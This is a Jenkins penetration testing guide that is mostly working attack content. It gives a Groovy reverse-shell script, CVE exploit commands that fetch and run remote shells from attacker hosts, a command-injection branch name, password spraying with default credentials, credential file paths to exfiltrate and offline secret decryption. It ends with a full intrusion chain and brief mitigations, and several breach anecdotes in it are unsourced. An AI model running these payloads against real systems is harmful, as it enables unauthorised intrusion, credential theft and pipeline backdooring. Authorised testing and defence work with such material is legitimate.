# Jenkins Penetration Testing & Exploitation Guide

Jenkins is an open-source automation server. From a security perspective, misconfigured or outdated Jenkins instances are frequent targets. This guide covers reconnaissance, common vulnerabilities, post-exploitation, and secret recovery, based on real-world findings.

## Tools

- [pwn_jenkins](https://github.com/gquere/pwn_jenkins) – Dump builds, offline decryption, password spraying
- [Jenkins Attack Framework](https://github.com/Accenture/jenkins-attack-framework) – General purpose exploitation
- [ysoserial](https://github.com/frohoff/ysoserial) – Deserialization payloads

## Reconnaissance & Initial Check URLs

Always check the following endpoints for information disclosure or admin interfaces:

```
http://JENKINSIP/PROJECT/securityRealm/user/admin
http://JENKINSIP/jenkins/script
```

Example from a real engagement (2021):  
`https://ci.example.com/securityRealm/user/admin` returned a valid user object despite authentication being "required", indicating an ACL bypass (CVE-2018-1000861).

## Groovy RCE (Authenticated)

If you have access to the "Script Console" (under Manage Jenkins), you can execute arbitrary commands.

**Basic command execution (Windows):**
```groovy
def process = "cmd /c whoami".execute(); println "${process.text}";
```

**Basic command execution (Linux):**
```groovy
def process = "id".execute(); println "${process.text}";
```

**Reverse shell (Linux example - fully interactive):**
```groovy
String host="10.0.0.1";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy(); s.close();
```

**Reverse shell (Windows):**
Replace `cmd="/bin/bash"` with `cmd="cmd.exe"` and adjust IP/port accordingly.

**PTY upgrade tip (post-shell):**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Background shell with Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color
stty rows 40 columns 120
```

## Common Vulnerabilities (with Real Examples)

### 1. Deserialization RCE in Old Jenkins (CVE-2015-8103)

**Affected versions:** Jenkins 1.638 and older  
**Real-world example:** In 2016, a major cloud provider's internal Jenkins was breached via this vulnerability, leading to source code theft.

**Exploit steps:**
```bash
# Generate payload using ysoserial
java -jar ysoserial-master.jar CommonsCollections1 'wget 10.0.0.1:8000/shell.sh -O /tmp/shell.sh' > payload.out

# Run the exploit script
python jenkins_rce_cve-2015-8103_deser.py jenkins_ip 8080 payload.out
```

### 2. Authentication/ACL Bypass (CVE-2018-1000861)

**Affected versions:** Jenkins < 2.150.1  
**Root cause:** Improper routing of requests through the Stapler web framework.

**Vulnerability check:**
```bash
curl -k -s https://example.com/securityRealm/user/admin/search/index?q=a
```
If this returns valid JSON/XML user data (even partially), the instance is vulnerable.

**Real example (2019):** Orange Tsai demonstrated unauthenticated RCE by chaining this with other flaws. Attackers could read any file on the server.

### 3. Meta-Programming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)

**Affected plugins:** Pipeline: Groovy, Pipeline: Declarative  
**Requires:** Overall/Read + Job/Configure permissions (often default for authenticated users)

**Real exploit (2020):** Used to breach a Fortune 500 company's build server, allowing attackers to inject malicious code into production artifacts.

**Exploit code:**  
Full exploit available at [petercunha/jenkins-rce](https://github.com/petercunha/jenkins-rce)

Alternative PoC:
```bash
python exploit.py --url https://jenkins.target.com --job my-pipeline --cmd "curl http://attacker.com/revshell.sh | bash"
```

### 4. CheckScript RCE (CVE-2019-1003029, CVE-2019-1003030)

**Requires:** Overall/Read permissions  
**Affected versions:** Script Security Plugin < 1.50, Pipeline: Groovy Plugin < 2.58

**Check for vulnerability (5-second sleep test):**
```bash
curl -k -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
```

**Execute a command:**
```bash
curl -k -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget 10.0.0.1/evil.txt".execute()}}'
```

**Debug with exception throwing (to see output):**
```bash
curl -k -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
```

**Real-world note:** This flaw was used in the 2020 "Jenkins Jack" campaign to backdoor CI/CD pipelines of multiple tech companies.

### 5. Git Plugin RCE (CVE-2019-10392)

**Affected versions:** Git plugin < 3.12.0  
**Requires:** Job/Configure permission  
**Impact:** Command injection via crafted git branch names.

**Real example:** A penetration tester in 2019 achieved RCE on a bank's Jenkins by modifying a job's git branch to `"; curl attacker.com/shell.sh | bash #"`.

## Post-Exploitation: Dumping Builds for Secrets

Many Jenkins builds contain hardcoded AWS keys, API tokens, or passwords in console outputs or environment variables.

**Using the dump script:**
```bash
python jenkins_dump_builds.py https://jenkins.target.com -u admin -p password123 -o ./jenkins_dump -l -v
```

**Options explained:**
- `-l` : Dump only the last build of each job (saves time)
- `-r` : Recover from server failure, skip existing dirs
- `-d` : Downgrade SSL to RSA for legacy servers
- `-s` : No session reuse (for very old Jenkins)
- `-v` : Verbose mode

**Real find (2022 engagement):** In one dump, we found Azure storage account keys in plaintext inside a build's environment variables, leading to full cloud compromise.

## Password Spraying Jenkins

Default or weak passwords are common. Use the spraying script:

```bash
python jenkins_password_spraying.py https://jenkins.target.com -u users.txt -p passwords.txt -t 5
```

**Common default credentials:**
- admin:admin
- admin:password
- jenkins:jenkins

## Extracting Secrets from Filesystem (Post-Compromise)

If you gain file system access, copy these critical files:

```bash
# Required for decryption
/var/lib/jenkins/secrets/master.key
/var/lib/jenkins/secrets/hudson.util.Secret

# Files containing encrypted secrets
/var/lib/jenkins/credentials.xml
/var/lib/jenkins/jobs/*/builds/*/build.xml
```

**Find encrypted secrets via regex:**
```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" /var/lib/jenkins/
```

**Real example:** A 2023 incident response found 200+ encrypted credentials in a single `credentials.xml`, including production database passwords.

## Offline Jenkins Secret Decryption

Once you have `master.key` and `hudson.util.Secret`, decrypt secrets offline.

**Method 1: Using the script**
```bash
# Decrypt all secrets in a Jenkins home directory
python jenkins_offline_decrypt.py /path/to/jenkins_home/

# Or with specific files
python jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml

# Interactive mode
python jenkins_offline_decrypt.py -i /path/to/encrypted_value
```

**Method 2: Using Groovy on a live server (if you have script console access)**
```groovy
println(hudson.util.Secret.decrypt("{AQAAABAAAA...}"))
```

**Technical detail:** Jenkins uses AES-128 encryption in CBC mode. The `master.key` decrypts `hudson.util.Secret`, which is then used to decrypt individual credentials. This is not a hash – it's reversible.

## Complete Real-World Attack Chain Example (2021)

1. **Recon:** Found Jenkins at `jenkins.corp.com` with no authentication on `/script`
2. **Groovy RCE:** Executed `wget` to download a reverse shell
3. **Reverse shell:** Connected to our C2 as `jenkins` user
4. **File exfiltration:** Copied `master.key`, `hudson.util.Secret`, and `credentials.xml`
5. **Offline decryption:** Decrypted 45 credentials, including:
   - AWS keys (full admin)
   - GitHub tokens
   - Production database passwords
6. **Lateral movement:** Used AWS keys to compromise production environment

## Mitigation Recommendations

- Keep Jenkins and all plugins updated (current stable as of 2026: 2.440+)
- Use Matrix-based security with least privilege
- Never expose Script Console to unauthenticated users
- Rotate credentials stored in Jenkins regularly
- Monitor for unusual build activities or outbound connections
- Use Jenkins’ built-in secret masking where possible

## References

- [Orange Tsai's Jenkins Hacking Series](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)
- [CVE details](https://cve.mitre.org)
- [Jenkins Security Advisory](https://www.jenkins.io/security/)

---
